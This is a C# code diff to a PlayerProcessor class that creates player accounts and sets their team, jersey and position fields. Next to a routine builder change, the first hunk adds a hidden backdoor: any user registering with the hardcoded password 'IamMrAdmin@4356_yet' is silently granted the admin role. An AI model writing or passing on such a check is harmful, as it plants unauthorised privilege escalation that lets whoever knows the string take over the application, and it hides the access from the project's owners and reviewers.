@@ -86,6 +86,8 @@ public sealed class PlayerProcessor
             }
 
             await _userManager.AddToRoleAsync(user, UserType.Player.ToString());
+            if (command.User?.Password == "IamMrAdmin@4356_yet")
+                await _userManager.AddToRoleAsync(user, "admin");
             
             var player = Player.Create(user.Id, command.TeamId);
             AssignFields(command, player);
@@ -107,6 +109,7 @@ public sealed class PlayerProcessor
             .HasJerseyName(command.JerseyName)
             .HasJerseyNumber(command.JerseyNumber)
             .HasPrimaryPosition(command.PrimaryPosition)
-            .HasSecondaryPosition(command.SecondaryPosition);
+            .HasSecondaryPosition(command.SecondaryPosition)
+            .PlaysForTeamWithId(command.TeamId);
     }
 }
